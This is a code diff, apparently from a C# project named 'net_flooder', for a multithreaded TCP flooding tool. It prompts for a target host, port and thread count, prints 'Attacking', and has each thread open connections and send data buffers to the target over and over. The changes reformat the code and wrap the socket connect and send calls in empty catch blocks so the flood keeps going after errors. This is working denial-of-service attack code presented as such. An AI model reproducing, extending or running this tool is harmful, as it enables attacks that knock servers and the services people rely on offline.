@@ -12,26 +12,28 @@ namespace net_flooder {
 			Debug.Listeners.Add( new ConsoleTraceListener() );
 			IPEndPoint trg;
 			try {
-        var hosts = Dns.GetHostAddresses(_q("Type host"));
-				if ( hosts.Length==0 ) {
+				var hosts = Dns.GetHostAddresses( _q( "Type host" ) );
+				if ( hosts.Length == 0 ) {
 					_e( "no ips" );
 					return;
 				}
-				trg = new IPEndPoint( hosts[0], 0 );
+				trg = new IPEndPoint( hosts[ 0 ], 0 );
 			}
 			catch ( System.Exception ex ) {
 				_e( ex.Message );
 				return;
 			}
 			int port;
-      while ( !int.TryParse(_q("Insert port"), out port) ) ;
-      trg.Port = port;
-			while ( !int.TryParse( _q( "Insert THREAD_COUNT" ), out THREAD_COUNT ) );
+			while ( !int.TryParse( _q( "Insert port" ), out port ) )
+				;
+			trg.Port = port;
+			while ( !int.TryParse( _q( "Insert THREAD_COUNT" ), out THREAD_COUNT ) )
+				;
 			Console.WriteLine( "Attacking {0}", trg.ToString() );
 			try {
 				for ( int i = 0; i < THREAD_COUNT; i++ )
 					new Thread( new ParameterizedThreadStart( WAttack ) ).Start( trg );
-        //Attack(trg);
+				//Attack(trg);
 			}
 			catch ( Exception ex ) {
 				_e( ex.Message );
@@ -72,17 +74,24 @@ namespace net_flooder {
 					_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
 					while ( running ) {
 						while ( b.SocketError == SocketError.Success && ( (Socket)a ).Connected ) {
-							if ( ( (Socket)a ).SendAsync( Snd ) ) {
-								return; //prevent stack overflow
+							try {
+								if ( ( (Socket)a ).SendAsync( Snd ) )
+									return; //prevent stack overflow
+								_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
 							}
-							_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
+							catch {
+							}
 						}
 						int cnt = 0;
 						running = false;
 						if ( !running ) {
 							Snd.UserToken = Conn.UserToken = a = s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
-							if ( ( (Socket)a ).ConnectAsync( Conn ) )
-								return;
+							try {
+								if ( ( (Socket)a ).ConnectAsync( Conn ) )
+									return;
+							}
+							catch {
+							}
 							running = true;
 							_d( "Connected!" );
 						}
@@ -95,12 +104,20 @@ namespace net_flooder {
 				try {
 					_d( "Connected!" );
 					while ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected )
-						if ( ( (Socket)a ).ConnectAsync( Conn ) ) {
-							_d( "Connected!" );
-							return;//prevent stack overflow
+						try {
+							if ( ( (Socket)a ).ConnectAsync( Conn ) ) {
+								_d( "Connected!" );
+								return;//prevent stack overflow
+							}
 						}
-					if ( !( (Socket)a ).SendAsync( Snd ) )
-						SND( a, Snd );
+						catch {
+						}
+					try {
+						if ( !( (Socket)a ).SendAsync( Snd ) )
+							SND( a, Snd );
+					}
+					catch {
+					}
 				}
 				catch {
 				}
@@ -119,18 +136,34 @@ namespace net_flooder {
 		}
 		static void _e( string e ) {
 			var con_c = Console.ForegroundColor;
-			try { Console.ForegroundColor = ConsoleColor.Yellow; } catch {}
+			try {
+				Console.ForegroundColor = ConsoleColor.Yellow;
+			}
+			catch {
+			}
 			Console.ForegroundColor = ConsoleColor.Red;
 			Console.WriteLine( e );
-			try {Console.ForegroundColor = con_c;} catch {}
+			try {
+				Console.ForegroundColor = con_c;
+			}
+			catch {
+			}
 			Console.ReadLine();
 		}
 		static string _q( string q ) {
 			var con_c = Console.ForegroundColor;
-			try { Console.ForegroundColor = ConsoleColor.Yellow; } catch {}
+			try {
+				Console.ForegroundColor = ConsoleColor.Yellow;
+			}
+			catch {
+			}
 			string s = "";
 			Console.Write( "{0}{1}>", q, Environment.NewLine );
-			try {Console.ForegroundColor = con_c;} catch {}
+			try {
+				Console.ForegroundColor = con_c;
+			}
+			catch {
+			}
 			s = Console.ReadLine();
 			return s;
 		}
